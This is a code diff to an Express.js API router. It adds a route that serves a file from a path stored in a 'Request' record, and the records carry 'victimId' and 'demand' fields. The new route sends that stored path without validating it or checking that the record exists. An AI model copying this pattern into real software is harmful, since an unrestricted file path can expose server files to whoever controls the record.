@@ -1,5 +1,6 @@
 import { Router } from "express";
 import Request from '../models/requestModel.js';
+import path from 'path';
 
 const router = Router();
 
@@ -14,6 +15,7 @@ router.post('/createRequest', async (req, res, next) => {
             victimId: req.body.victimId,
             demand: req.body.demand,
         });
+        //TODO check VictimId from Victims database before creating a request
 
         const savedRequest = await request.save();
         res.json(savedRequest);
@@ -35,6 +37,18 @@ router.get('/requests/:victimId', async (req, res, next) => {
     }
 });
 
+/**
+ * Get a specific request's data (fulfilled)
+ * @route GET /api/client/request/:requestId
+ */
+router.get('/request/:requestId', async (req, res, next) => {
+    try {
+        const request = await Request.findById(req.params.requestId);
+        res.sendFile(path.join(path.resolve(), request.fulfilledAt));
+    } catch (err) {
+        next(err);
+    }
+});
 /**
  * Health check for client route
  * @route GET /api/client/health
